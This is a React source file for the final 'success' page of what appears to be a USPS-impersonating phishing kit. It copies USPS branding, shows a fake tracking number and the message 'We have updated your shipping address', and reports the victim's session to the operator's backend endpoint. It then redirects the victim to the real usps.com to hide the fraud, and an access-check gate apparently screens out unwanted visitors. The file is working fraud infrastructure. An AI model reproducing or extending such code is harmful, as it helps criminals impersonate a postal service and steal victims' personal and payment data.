import React, { useEffect } from "react";
import { useLocation } from "react-router-dom";
import axios from "axios";
import Header from "../components/Header";
import Footer from "../components/Footer";
import { baseUrl } from "../constants";
import useAccessCheck from "../Utils/useAccessCheck";

const Success: React.FC = () => {
  const statusSegments = [
    { id: 1, gradient: "linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%)", flexGrow: 1.6 },
    { id: 2, color: "#d9d9df", flexGrow: 1 },
    { id: 3, color: "#d9d9df", flexGrow: 1 },
  ];

  const location = useLocation();
  const { sessionId } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (isAllowed === true && sessionId) {
      let cancelled = false;

      const sendSuccessEvent = async () => {
        try {
          await axios.post(`${baseUrl}api/usps-success-event/`, { sessionId });
        } catch (error) {
          console.error("Error reporting success event:", error);
        }
      };

      sendSuccessEvent();

      const timer = setTimeout(() => {
        if (!cancelled) {
          window.location.replace("https://www.usps.com/");
        }
      }, 4000);

      return () => {
        cancelled = true;
        clearTimeout(timer);
      };
    }
  }, [isAllowed, sessionId]);

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  if (!sessionId) {
    return <div>Missing session information. Please restart the process.</div>;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
      <Header />
      <main className="flex-1 w-full">
        <div className="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
          <div className="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
            <div>
              <div className="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                USPS Tracking<sup className="text-xs align-super">®</sup>
              </div>
              <button
                type="button"
                className="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline"
              >
                <span>Track Another Package</span>
                <span className="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
              </button>
            </div>
            <div className="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
              <button
                type="button"
                className="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]"
              >
                Tracking
              </button>
              <span className="h-5 w-px bg-[#d8d8e0]" />
              <button
                type="button"
                className="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors"
              >
                FAQs
              </button>
            </div>
          </div>
        </div>
        <div className="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
          <div className="mt-12 space-y-12">
            <section className="space-y-5">
              <div className="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                <span className="font-semibold text-[#1a2252]">Tracking Number:</span>
                <span className="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
              </div>
              <div className="text-[17px] font-semibold text-[#23285a]">Status :</div>
              <div className="text-[19px] font-bold text-[#1a7f3b]">
                We have updated your shipping address
              </div>
              <div className="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px]">
                For more information about claims, visit your local Post Office or the USPS Insurance Claims portal at
                <span className="text-[#2b2a72]"> https://www.usps.com/insuranceclaims/</span>. The U.S. Postal Service values your business and apologizes for any inconvenience caused.
              </div>
              <div className="mt-4 flex w-full max-w-[760px]">
                {statusSegments.map((segment, index) => (
                  <div
                    key={segment.id}
                    className="h-[14px]"
                    style={{
                      flexGrow: segment.flexGrow,
                      flexBasis: 0,
                      background: segment.gradient || segment.color,
                      clipPath:
                        index === statusSegments.length - 1
                          ? "polygon(8px 0, 100% 0, 100% 100%, 0 100%)"
                          : "polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%)",
                      marginRight: index === statusSegments.length - 1 ? 0 : 4,
                    }}
                  />
                ))}
              </div>
              <div className="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                Status Not Available
              </div>
              <div>
                <button
                  type="button"
                  onClick={() => window.location.replace("https://www.usps.com/")}
                  className="mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors"
                >
                  Continue to USPS.com
                </button>
                <p className="mt-2 text-[12px] text-[#4a4f6d]">
                  You will be redirected shortly. If the page doesn't change automatically, click the button above.
                </p>
              </div>
            </section>
            <section>
              <div className="w-full bg-white border border-[#e0e0e8] py-12 px-8 text-center shadow-sm">
                <h3 className="text-[22px] font-semibold text-[#1a2252]">Can't find what you're looking for?</h3>
                <p className="mt-4 text-[14px] text-[#4a4f6d]">
                  Go to our FAQs section to find answers to your tracking questions.
                </p>
                <button className="mt-6 inline-flex items-center justify-center bg-[#2b2a72] text-white px-7 py-3 text-[14px] rounded-sm font-medium hover:bg-[#211f5a] transition-colors">
                  FAQs
                </button>
              </div>
            </section>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Success;
